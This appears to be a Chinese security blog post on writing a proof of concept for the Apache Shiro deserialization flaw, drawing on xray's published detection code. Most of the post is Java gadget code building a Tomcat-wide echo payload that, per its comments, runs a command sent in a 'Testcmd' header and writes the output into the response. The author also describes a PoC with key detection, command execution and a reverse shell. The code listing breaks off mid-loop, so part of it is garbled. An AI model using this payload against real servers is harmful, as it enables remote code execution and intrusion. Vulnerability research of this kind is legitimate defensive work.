没想到写完poc的第二天，xray的作者就给出检测细节和源码。
  * 
  * 
通过比对源码:
可以找到tomcat的全版本回显的payload
    public static Object createTemplatesTomcatEcho() throws Exception {
            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
                return createTemplatesImplEcho(
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
            }
            return createTemplatesImplEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
        }
        // Tomcat 全版本 payload，测试通过 tomcat6,7,8,9
        // 给请求添加 Testecho: 123，将在响应 header 看到 Testecho: 123，可以用与可靠漏洞的漏洞检测
        // 给请求添加 Testcmd: id 会执行 id 命令并将回显写在响应 body 中
        public static  T createTemplatesImplEcho(Class tplClass, Class abstTranslet, Class transFactory)
            throws Exception {
            final T templates = tplClass.newInstance();
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            CtClass clazz;
            clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
            if (clazz.getDeclaredConstructors().length != 0) {
                clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
            }
            clazz.addMethod(CtMethod.make("private static void writeBody(Object resp, byte[] bs) throws Exception {\n" +
                "    Object o;\n" +
                "    Class clazz;\n" +
                "    try {\n" +
                "        clazz = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
                "        o = clazz.newInstance();\n" +
                "        clazz.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
                "    } catch (ClassNotFoundException e) {\n" +
                "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
                "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
                "    } catch (NoSuchMethodException e) {\n" +
                "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
                "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
                "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
                "    }\n" +
                "}", clazz));
            clazz.addMethod(CtMethod.make("private static Object getFV(Object o, String s) throws Exception {\n" +
                "    java.lang.reflect.Field f = null;\n" +
                "    Class clazz = o.getClass();\n" +
                "    while (clazz != Object.class) {\n" +
                "        try {\n" +
                "            f = clazz.getDeclaredField(s);\n" +
                "            break;\n" +
                "        } catch (NoSuchFieldException e) {\n" +
                "            clazz = clazz.getSuperclass();\n" +
                "        }\n" +
                "    }\n" +
                "    if (f == null) {\n" +
                "        throw new NoSuchFieldException(s);\n" +
                "    }\n" +
                "    f.setAccessible(true);\n" +
                "    return f.get(o);\n" +
                "}\n", clazz));
            clazz.addConstructor(CtNewConstructor.make("public TomcatEcho() throws Exception {\n" +
                "    Object o;\n" +
                "    Object resp;\n" +
                "    String s;\n" +
                "    boolean done = false;\n" +
                "    Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
                "    for (int i = 0; i  ysoserial 中的 `CommonsCollections4` 只能用于 CC4.0 版本，我把这个利用链进行了改进使其支持了 CC3 和 CC4
> 两个版本，形成了上面说的 K1/K2 两条链，这两条链就是我们处理 Shiro
> 这个环境的秘密武器。经过这些准备，我们已经从手无缚鸡之力的书生变为了身法矫健的少林武僧，可以直击敌方咽喉，一举拿下目标。万事具备，只欠东风。
## PoC演示
一路下来迷迷糊糊啥也不明白真实太菜了，只能在一些大佬的肩膀上搬搬砖这样子了。
PoC集成了识别，检测key，命令执行回显以及shell反弹的操作。
检测识别key
攻击模式执行任意命令
shell反连
最后也顺便给[w13scan - 被动扫描器](https://github.com/w-digital-scanner/w13scan)增加了一份Shiro插件。
感谢看完全程，不说了，学习java去。
* * *